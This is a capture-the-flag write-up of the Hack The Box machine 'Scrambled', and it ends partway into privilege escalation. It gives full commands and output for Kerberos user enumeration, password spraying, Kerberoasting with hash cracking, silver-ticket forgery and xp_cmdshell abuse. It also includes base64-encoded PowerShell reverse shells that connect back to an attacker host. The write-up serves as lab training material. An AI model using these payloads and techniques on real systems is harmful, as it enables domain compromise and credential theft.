---
tags:
  - HTB
  - Hacking
  - Boot2Root
  - Windows
  - Kerbrute
  - Insecure-Deserialization
  - ILSpy
  - DotNet
  - Kerberoasting
  - SilverTicket
  - Ysoserial
---
# Overview

| Name        | Scrambled   |
| ----------- | ----------- |
| OS          | Windows     |
| Base Points | Medium [30] |
| Status      | Done        |
# Recon
## Nmap 

```bash
$ sudo nmap -sC -sV -p- -T4 10.129.86.49
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-18 19:36 CDT
Stats: 0:03:44 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 71.43% done; ETC: 19:40 (0:00:15 remaining)
Nmap scan report for 10.129.86.49
Host is up (0.14s latency).
Not shown: 65514 filtered tcp ports (no-response)
Bug in ms-sql-ntlm-info: no string output.
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Scramble Corp Intranet
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-18 16:39:17Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC1.scrm.local
| Not valid before: 2024-09-04T11:14:45
|_Not valid after:  2121-06-08T22:39:53
|_ssl-date: 2025-10-18T16:42:32+00:00; -8h00m01s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC1.scrm.local
| Not valid before: 2024-09-04T11:14:45
|_Not valid after:  2121-06-08T22:39:53
|_ssl-date: 2025-10-18T16:42:30+00:00; -8h00m01s from scanner time.
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ssl-date: 2025-10-18T16:42:32+00:00; -8h00m01s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-10-18T16:36:23
|_Not valid after:  2055-10-18T16:36:23
| ms-sql-info: 
|   10.129.86.49:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC1.scrm.local
| Not valid before: 2024-09-04T11:14:45
|_Not valid after:  2121-06-08T22:39:53
|_ssl-date: 2025-10-18T16:42:32+00:00; -8h00m01s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2025-10-18T16:42:30+00:00; -8h00m01s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC1.scrm.local
| Not valid before: 2024-09-04T11:14:45
|_Not valid after:  2121-06-08T22:39:53
4411/tcp  open  found?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, NCP, NULL, NotesRPC, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
|     SCRAMBLECORP_ORDERS_V1.0.3;
|   FourOhFourRequest, GetRequest, HTTPOptions, Help, LPDString, RTSPRequest, SIPOptions: 
|     SCRAMBLECORP_ORDERS_V1.0.3;
|_    ERROR_UNKNOWN_COMMAND;
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49701/tcp open  msrpc         Microsoft Windows RPC
49709/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4411-TCP:V=7.94SVN%I=7%D=10/18%Time=68F43336%P=x86_64-pc-linux-gnu%
SF:r(NULL,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(GenericLines,1D,"SCRAM
SF:BLECORP_ORDERS_V1\.0\.3;\r\n")%r(GetRequest,35,"SCRAMBLECORP_ORDERS_V1\
SF:.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(HTTPOptions,35,"SCRAMBLECORP_O
SF:RDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(RTSPRequest,35,"SCRAM
SF:BLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(RPCCheck,1D,
SF:"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(DNSVersionBindReqTCP,1D,"SCRAMBL
SF:ECORP_ORDERS_V1\.0\.3;\r\n")%r(DNSStatusRequestTCP,1D,"SCRAMBLECORP_ORD
SF:ERS_V1\.0\.3;\r\n")%r(Help,35,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_U
SF:NKNOWN_COMMAND;\r\n")%r(SSLSessionReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;
SF:\r\n")%r(TerminalServerCookie,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r
SF:(TLSSessionReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(Kerberos,1D,"S
SF:CRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(SMBProgNeg,1D,"SCRAMBLECORP_ORDERS
SF:_V1\.0\.3;\r\n")%r(X11Probe,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(F
SF:ourOhFourRequest,35,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COM
SF:MAND;\r\n")%r(LPDString,35,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKN
SF:OWN_COMMAND;\r\n")%r(LDAPSearchReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\
SF:n")%r(LDAPBindReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(SIPOptions,
SF:35,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(LAN
SF:Desk-RC,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(TerminalServer,1D,"SC
SF:RAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(NCP,1D,"SCRAMBLECORP_ORDERS_V1\.0\.
SF:3;\r\n")%r(NotesRPC,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(JavaRMI,1
SF:D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(WMSRequest,1D,"SCRAMBLECORP_OR
SF:DERS_V1\.0\.3;\r\n")%r(oracle-tns,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n
SF:")%r(ms-sql-s,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(afp,1D,"SCRAMBL
SF:ECORP_ORDERS_V1\.0\.3;\r\n")%r(giop,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r
SF:\n");
Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-10-18T16:41:52
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: -8h00m01s, deviation: 0s, median: -8h00m01s
```

```bash
echo "10.129.86.49 dc1.scrm.local scrm.local" | sudo tee -a /etc/hosts
```
# Enumeration
## Kerbrute

We can use this username [list](https://github.com/attackdebris/kerberos_enum_userlists).

```bash
$ ./kerbrute_linux_amd64 userenum --dc 10.129.86.49 -d scrm.local kerberos_enum_userlists/A-ZSurnames.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 10/18/25 - Ronnie Flathers @ropnop

2025/10/18 19:51:40 >  Using KDC(s):
2025/10/18 19:51:40 >  	10.129.86.49:88

2025/10/18 19:51:40 >  [+] VALID USERNAME:	 ASMITH@scrm.local
2025/10/18 19:53:09 >  [+] VALID USERNAME:	 JHALL@scrm.local
2025/10/18 19:53:17 >  [+] VALID USERNAME:	 KSIMPSON@scrm.local
2025/10/18 19:53:21 >  [+] VALID USERNAME:	 KHICKS@scrm.local
2025/10/18 19:54:30 >  [+] VALID USERNAME:	 SJENKINS@scrm.local
```

 Password spraying (try username as password)

```bash
$ echo -e "asmith\njhall\nksimpson\nkhicks\nsjenkins" > valid_users.txt
```

![[scrambled.png]]

Password reset page tells about password being reset to same as username so let’s try to see if the username we have as a password.

```bash
$ sudo ntpdate 10.129.86.49
2025-10-18 12:11:31.417684 (-0500) -28800.966843 +/- 0.076473 10.129.86.49 s1 no-leap
CLOCK: time stepped by -28800.966843

$ ./kerbrute_linux_amd64 passwordspray valid_users.txt ksimpson -d scrm.local --dc 10.129.86.49 --user-as-pass

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 10/18/25 - Ronnie Flathers @ropnop

2025/10/18 12:11:35 >  Using KDC(s):
2025/10/18 12:11:35 >  	10.129.86.49:88

2025/10/18 12:11:41 >  [+] VALID LOGIN:	 ksimpson@scrm.local:ksimpson
```
# Initial Foothold

Get kerberos ticket for `ksimpson`.

```bash
$ getTGT.py scrm.local/ksimpson:ksimpson -dc-ip 10.129.86.49
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in ksimpson.ccache
```

```bash
$ export KRB5CCNAME=ksimpson.ccache
```

Having the ticket we can try to authenticate on SMB with `smbclient` but won't work.

```bash
$ smbclient -L //10.129.86.49/ -k
WARNING: The option -k|--kerberos is deprecated!
Kerberos auth with 'ninjathebox98w1@WORKGROUP' (WORKGROUP\ninjathebox98w1) to access '10.129.86.49' not possible
session setup failed: NT_STATUS_ACCESS_DENIED
```

Use Impacket tools.

```bash
$ smbclient.py -k -no-pass scrm.local/ksimpson@dc1.scrm.local
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# shares
ADMIN$
C$
HR
IPC$
IT
NETLOGON
Public
Sales
SYSVOL
# use Public
# ls
drw-rw-rw-          0  Thu Nov  4 17:23:19 2021 .
drw-rw-rw-          0  Thu Nov  4 17:23:19 2021 ..
-rw-rw-rw-     630106  Fri Nov  5 12:45:07 2021 Network Security Changes.pdf
# get Network Security Changes.pdf
```

![[scrambled2.png]]

It talks about disabling NTLM authentication so we can try kerberoasting and Silver Ticket Attack.
## Kerberoasting

```bash
$ GetUserSPNs.py -request -dc-host dc1.scrm.local scrm.local/ksimpson -k -no-pass
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName          Name    MemberOf  PasswordLastSet             LastLogon                   Delegation 
----------------------------  ------  --------  --------------------------  --------------------------  ----------
MSSQLSvc/dc1.scrm.local:1433  sqlsvc            2021-11-03 11:32:02.351452  2025-10-18 11:36:12.514614             
MSSQLSvc/dc1.scrm.local       sqlsvc            2021-11-03 11:32:02.351452  2025-10-18 11:36:12.514614             



$krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local/sqlsvc*$08e1006d24b94d9cf20caadf32ed7349$c9161232c9952304296bb719715e95828578cabf5630a13be7e29e0d4a702c3ec7790ce67a4497fd75306345f0fc3c00ef3442cfc29fdd9552af00240273c2b017c3b2bc4545beb9683fc4cc15ffcea3438d2af1415b269954635b53133ae7bc08d8b084d64079225b6e2d9a7ccbcc3b1c4533fe614151e6e05c02edd1f32a603e2813db21f925ef3c9c96a63c01fd22a2d40d0b74320604e300d8907f32aca2ef76c3ca23f596fcdb97f778e2376b9221de62f34ca9b907a41c7c63ba68fd5c528cb8888efa5e7a7ed694d3d6669865648ef5b1fb81abbc84b33b1f94b579ce0befc74cbcae042fb4f750969c97aed0db0c8b25627517c25c15618ce342e1ecf829cc8b049951445a65dc8c00ab9de58af596203cfefc39ece2c5770fb4cfb3bc9e8b89e9fa4311a354ac4575354b9bcc0f3649a19a1f67e2f6dc9ebe16c9d5724db1f1979ec7149dd1cc484e242c8d821b2713f969df7497f949c9cba2c8b3f5d57f396d8a9232e3e26c0cdb38db553232cf12c87687570be0c4d5325f7f1e0b0ce1a538f4aef30122ed20b5c9f5cdc3e32b44e44c551e79a2624f65a18dd82b3c3a5f1853ac8a834374160f9ba27bbea75176bcedaf71bc2b3e55938bb31a883feb74899eac56fb55a7b1097bed6fde752bddbf20888bee57d17bc6c1b87eaea7bce6f7ccfe45ace53fcfe0f5aaccec892a45ed3b6672ddd559d9197df03652ecb21132c407d991a611a425f270274b3b07d5ef93d868091946e0ae6888898eba767f07004b1e48433067cc10b3b811f4d4cb45a179ec6e854cea7516c68fb281f1b4fbe25581b954135854668f7706933ab2a448673fdbead63a43b0154c675fa6ebafb7bacb99aace476c73535168c88fc826876335e20ccf316738f72bf9c87bf5c0a67b7e31ce658255fdedfe97e312a4bded3d5459495e2a807e9bc7825bc7bfcd506af385703ecab1473a26468e521ab20196ad71fe5d4415a24a9e829116c7720db5a6d78ea1a106299aa1297dae855de707e85b543e41790aa067561d54b9296e33b1523df99c73d863ad340fec8baa92fc0e95eca4135dcee03b8610a9a4238235dc0107678868fb63c3818d12de23c0c7bdd4d176a5b65463d650d55aec778cb96fd871104021a027ec8c99cd44e505aa2331acfa48ccbd7b05b34fd9af27e38fe6d2ae7f9e8112047a9456a5ae2276d12c3546bf476d0e526bf4091bd8fc428676e13845e37cb143dd9f8a451b55dde522150272dd2efdb7f21087a901e6f3be7ac62d87e900132fff01b12505b280eaa43f324bc1498dc693c4edc8092657b409ca6c377e0a05643d8f5a34cdceb128912f7282b0eaa4f10064acae54dc01aa427f214d18d4eafa66680a486977846959d6c141c2d047b3b113a19ca5e617d3f845f38a7a9ee62dd0709b7180c11462d72fc5a3
```

Crack the hash.

```bash
$ hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
```

```bash
$krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local/sqlsvc*$08e1006d24b94d9cf20caadf32ed7349$c9161232c9952304296bb719715e95828578cabf5630a13be7e29e0d4a702c3ec7790ce67a4497fd75306345f0fc3c00ef3442cfc29fdd9552af00240273c2b017c3b2bc4545beb9683fc4cc15ffcea3438d2af1415b269954635b53133ae7bc08d8b084d64079225b6e2d9a7ccbcc3b1c4533fe614151e6e05c02edd1f32a603e2813db21f925ef3c9c96a63c01fd22a2d40d0b74320604e300d8907f32aca2ef76c3ca23f596fcdb97f778e2376b9221de62f34ca9b907a41c7c63ba68fd5c528cb8888efa5e7a7ed694d3d6669865648ef5b1fb81abbc84b33b1f94b579ce0befc74cbcae042fb4f750969c97aed0db0c8b25627517c25c15618ce342e1ecf829cc8b049951445a65dc8c00ab9de58af596203cfefc39ece2c5770fb4cfb3bc9e8b89e9fa4311a354ac4575354b9bcc0f3649a19a1f67e2f6dc9ebe16c9d5724db1f1979ec7149dd1cc484e242c8d821b2713f969df7497f949c9cba2c8b3f5d57f396d8a9232e3e26c0cdb38db553232cf12c87687570be0c4d5325f7f1e0b0ce1a538f4aef30122ed20b5c9f5cdc3e32b44e44c551e79a2624f65a18dd82b3c3a5f1853ac8a834374160f9ba27bbea75176bcedaf71bc2b3e55938bb31a883feb74899eac56fb55a7b1097bed6fde752bddbf20888bee57d17bc6c1b87eaea7bce6f7ccfe45ace53fcfe0f5aaccec892a45ed3b6672ddd559d9197df03652ecb21132c407d991a611a425f270274b3b07d5ef93d868091946e0ae6888898eba767f07004b1e48433067cc10b3b811f4d4cb45a179ec6e854cea7516c68fb281f1b4fbe25581b954135854668f7706933ab2a448673fdbead63a43b0154c675fa6ebafb7bacb99aace476c73535168c88fc826876335e20ccf316738f72bf9c87bf5c0a67b7e31ce658255fdedfe97e312a4bded3d5459495e2a807e9bc7825bc7bfcd506af385703ecab1473a26468e521ab20196ad71fe5d4415a24a9e829116c7720db5a6d78ea1a106299aa1297dae855de707e85b543e41790aa067561d54b9296e33b1523df99c73d863ad340fec8baa92fc0e95eca4135dcee03b8610a9a4238235dc0107678868fb63c3818d12de23c0c7bdd4d176a5b65463d650d55aec778cb96fd871104021a027ec8c99cd44e505aa2331acfa48ccbd7b05b34fd9af27e38fe6d2ae7f9e8112047a9456a5ae2276d12c3546bf476d0e526bf4091bd8fc428676e13845e37cb143dd9f8a451b55dde522150272dd2efdb7f21087a901e6f3be7ac62d87e900132fff01b12505b280eaa43f324bc1498dc693c4edc8092657b409ca6c377e0a05643d8f5a34cdceb128912f7282b0eaa4f10064acae54dc01aa427f214d18d4eafa66680a486977846959d6c141c2d047b3b113a19ca5e617d3f845f38a7a9ee62dd0709b7180c11462d72fc5a3:Pegasus60
```

We get password `Pegasus60`.
## Silver Ticket Attack

Hence we can create a silver ticket for as the user Administrator for this we need to get the SID of `MSSQLSVC`.

```bash
$ # Convert Pegasus60 to NTLM hash
python3 -c "import hashlib; print(hashlib.new('md4', 'Pegasus60'.encode('utf-16le')).hexdigest())"
b999a16500b87d17ec7f2e2a68778f05
```

Get Domain SID:

```bash
$ KRB5CCNAME=ksimpson.ccache secretsdump.py -k scrm.local/ksimpson@dc1.scrm.local -no-pass -debug 2>/dev/null | grep DRSCrackNames
[+] SID lookup unsuccessful, falling back to DRSCrackNames/GUID lookups
[+] Calling DRSCrackNames for S-1-5-21-2743207045-1827831105-2542523200-500 
```

**Domain SID: S-1-5-21-2743207045-1827831105-2542523200**

The part `-500` at the end is the RID (Relative Identifier) for the Administrator account, but the domain SID is everything before that.

Now create the silver ticket:

```bash
$ ticketer.py -nthash b999a16500b87d17ec7f2e2a68778f05 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain scrm.local -spn MSSQLSvc/dc1.scrm.local Administrator
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for scrm.local/Administrator
[*] 	PAC_LOGON_INFO
[*] 	PAC_CLIENT_INFO_TYPE
[*] 	EncTicketPart
[*] 	EncTGSRepPart
[*] Signing/Encrypting final ticket
[*] 	PAC_SERVER_CHECKSUM
[*] 	PAC_PRIVSVR_CHECKSUM
[*] 	EncTicketPart
[*] 	EncTGSRepPart
[*] Saving ticket in Administrator.ccache
```

```bash
$ export KRB5CCNAME=Administrator.ccache

$ mssqlclient.py -k -no-pass dc1.scrm.local
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC1): Line 1: Changed database context to 'master'.
[*] INFO(DC1): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (SCRM\administrator  dbo@master)> 
```

Enable `xp_cmdshell`:

```bash
$ mssqlclient.py -k -no-pass dc1.scrm.local
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC1): Line 1: Changed database context to 'master'.
[*] INFO(DC1): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (SCRM\administrator  dbo@master)> EXECUTE sp_configure 'show advanced options', 1;
INFO(DC1): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (SCRM\administrator  dbo@master)> RECONFIGURE;
SQL (SCRM\administrator  dbo@master)> EXECUTE sp_configure 'xp_cmdshell', 1;
INFO(DC1): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (SCRM\administrator  dbo@master)> RECONFIGURE;
SQL (SCRM\administrator  dbo@master)> EXEC xp_cmdshell 'whoami';
output        
-----------   
scrm\sqlsvc   

NULL          
```

```bash
SQL (SCRM\administrator  dbo@master)> SELECT name FROM master.sys.databases
name         
----------   
master       

tempdb       

model        

msdb         

ScrambleHR 
```

```bash
SQL (SCRM\administrator  dbo@master)> use ScrambleHR
ENVCHANGE(DATABASE): Old Value: master, New Value: ScrambleHR
INFO(DC1): Line 1: Changed database context to 'ScrambleHR'.
SQL (SCRM\administrator  dbo@ScrambleHR)> select * from ScrambleHR.INFORMATION_SCHEMA.TABLES
TABLE_CATALOG   TABLE_SCHEMA   TABLE_NAME   TABLE_TYPE   
-------------   ------------   ----------   ----------   
ScrambleHR      dbo            Employees    b'BASE TABLE'   

ScrambleHR      dbo            UserImport   b'BASE TABLE'   

ScrambleHR      dbo            Timesheets   b'BASE TABLE'   

SQL (SCRM\administrator  dbo@ScrambleHR)> select * from UserImport
LdapUser   LdapPwd             LdapDomain   RefreshInterval   IncludeGroups   
--------   -----------------   ----------   ---------------   -------------   
MiscSvc    ScrambledEggs9900   scrm.local                90               0   
```

We get username `MiscSvc` and Password `ScrambledEggs9900`.

Get Reverse Shell:

```bash
SQL (SCRM\administrator  dbo@master)> xp_cmdshell powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQAyADIAIgAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
```

```bash
$ rlwrap nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.14.122] from (UNKNOWN) [10.129.86.49] 52596

PS C:\Windows\system32> cd c:\Users
PS C:\Users> ls


    Directory: C:\Users


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----       05/11/2021     21:28                administrator                                                         
d-----       03/11/2021     19:31                miscsvc                                                               
d-r---       26/01/2020     17:54                Public                                                                
d-----       01/06/2022     14:58                sqlsvc      
```

We cant see `miscsvc` or other because we don't have enough privilege.

```bash
PS C:\Users\Public> whoami
scrm\sqlsvc
PS C:\Users\Public> $SecPassword = ConvertTo-SecureString 'ScrambledEggs9900' -AsPlainText -Force
PS C:\Users\Public> $Cred = New-Object System.Management.Automation.PSCredential('Scrm\MiscSvc', $SecPassword)
PS C:\Users\Public> Invoke-Command -Computer dc1 -Credential $Cred -Command { whoami }
scrm\miscsvc
```

We can now execute command as `miscsvc`. Get Reverse Shell Again from `miscsvc`:

```bash
PS C:\Users\Public> Invoke-Command -Computer dc1 -Credential $Cred -Command { powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQAyADIAIgAsADkAMAAwADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA }
```

```bash
$ nc -nlvp 9001
listening on [any] 9001 ...
connect to [10.10.14.122] from (UNKNOWN) [10.129.86.49] 50265

PS C:\Users\miscsvc\Documents> whoami
scrm\miscsvc
PS C:\Users\miscsvc\Documents> cd ..\Desktop
PS C:\Users\miscsvc\Desktop> ls


    Directory: C:\Users\miscsvc\Desktop


Mode                LastWriteTime         Length Name                                              
----                -------------         ------ ----                                              
-ar---       18/10/2025     17:35             34 user.txt                                          


PS C:\Users\miscsvc\Desktop> cat user.txt
8a806d91ba1610d87474c2837ff73dbf
```
# Privilege Escalation

```powershell
PS C:\Users\miscsvc\Desktop> cd c:\shares
PS C:\shares> ls


    Directory: C:\shares


Mode                LastWriteTime         Length Name                                              
----                -------------         ------ ----                                              
d-----       01/11/2021     15:21                HR                                                
d-----       03/11/2021     19:32                IT                                                
